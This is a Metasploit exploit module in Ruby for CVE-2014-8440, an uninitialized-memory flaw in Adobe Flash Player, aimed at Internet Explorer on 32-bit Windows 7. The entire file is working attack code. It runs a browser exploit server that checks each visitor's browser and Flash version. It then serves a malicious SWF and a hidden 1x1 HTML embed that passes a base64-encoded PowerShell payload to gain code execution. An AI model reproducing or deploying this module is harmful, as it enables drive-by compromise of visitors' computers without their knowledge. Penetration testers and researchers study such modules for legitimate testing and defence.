##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player UncompressViaZlibVariant Uninitialized Memory',
      'Description'         => %q{
        This module exploits an unintialized memory vulnerability in Adobe Flash Player. The
        vulnerability occurs in the ByteArray::UncompressViaZlibVariant method, which fails
        to initialize allocated memory. When using a correct memory layout this vulnerability
        leads to a ByteArray object corruption, which can be abused to access and corrupt memory.
        This module has been tested successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with
        Flash 15.0.0.189.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Nicolas Joly', # Vulnerability discovery
          'Unknown', # Exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2014-8440'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb14-24.html'],
          ['URL', 'http://malware.dontneedcoffee.com/2014/11/cve-2014-8440.html'],
          ['URL', 'http://www.verisigninc.com/en_US/cyber-security/security-intelligence/vulnerability-reports/articles/index.xhtml?id=1081']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^15\./ && ver <= '15.0.0.189' },
          :arch    => ARCH_X86
        },
      'Targets'             =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Nov 11 2014',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-8440', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

end
